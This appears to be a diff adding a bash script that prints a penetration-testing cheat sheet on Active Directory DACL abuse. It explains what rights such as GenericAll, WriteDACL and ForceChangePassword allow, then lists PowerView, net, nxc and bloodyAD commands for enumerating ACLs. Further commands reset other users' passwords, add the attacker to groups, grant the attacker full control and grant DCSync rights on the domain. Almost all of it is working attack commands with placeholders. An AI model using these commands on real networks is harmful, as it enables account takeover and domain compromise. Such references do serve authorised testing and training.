@@ -1,0 +1,54 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── DACL ABUSE ───────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Rights & What They Allow ─────────────────────────${NC}"
+echo -e "  ${GREEN}GenericAll${NC}            # Full control — reset password, add to group, modify SPN"
+echo -e "  ${GREEN}WriteDACL${NC}             # Modify DACL -> grant GenericAll to yourself"
+echo -e "  ${GREEN}ForceChangePassword${NC}   # Reset password without knowing old one"
+echo -e "  ${GREEN}AllExtendedRights${NC}     # Includes password reset"
+echo -e "  ${GREEN}GenericWrite${NC}          # Write non-protected attributes (SPN, RBCD, etc.)"
+echo -e "  ${GREEN}WriteOwner${NC}            # Change object owner -> gain full control"
+echo -e "  ${GREEN}Self${NC}                  # Write self to group membership"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumerate ACLs (PowerView) ───────────────────────${NC}"
+echo -e "  ${GREEN}Get-ObjectAcl -Identity <USER> -ResolveGUIDs${NC}"
+echo -e "  ${GREEN}Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ft${NC}"
+echo -e "  ${GREEN}Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object { \$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID \$_.SecurityIdentifier.value) -Force; \$_ } | Where { \$_.Identity -eq \"\$env:UserDomain\\\$env:Username\" }${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Exploits ─────────────────────────────────────────${NC}"
+echo -e "  Note: GenericAll on user — reset password:"
+echo -e "  ${GREEN}net user <TARGET_USER> NewPass123! /domain${NC}"
+printf "\n"
+echo -e "  Note: GenericAll on group — add member:"
+echo -e "  ${GREEN}net group <GROUP> <YOUR_USER> /add /domain${NC}"
+echo -e "  ${GREEN}Add-DomainGroupMember -Identity <GROUP> -Members <YOUR_USER>${NC}"
+printf "\n"
+echo -e "  Note: WriteDACL — grant yourself GenericAll:"
+echo -e "  ${GREEN}Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All${NC}"
+printf "\n"
+echo -e "  Note: ForceChangePassword:"
+echo -e "  ${GREEN}\$cred = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force${NC}"
+echo -e "  ${GREEN}Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword \$cred${NC}"
+printf "\n"
+echo -e "  Note: Grant DCSync rights (on domain object):"
+echo -e "  ${GREEN}Add-ObjectACL -TargetDistinguishedName 'dc=corp,dc=com' -PrincipalSamAccountName <USER> -Rights DCSync${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc / bloodyAD (from Kali) ───────────────────────${NC}"
+echo -e "  ${GREEN}nxc ldap <DC_IP> -u <USER> -p <PASS> --query '(objectClass=user)' 'sAMAccountName nTSecurityDescriptor'${NC}"
+echo -e "  ${GREEN}bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --dc-ip <DC_IP> set password <TARGET_USER> 'NewPass123!'${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
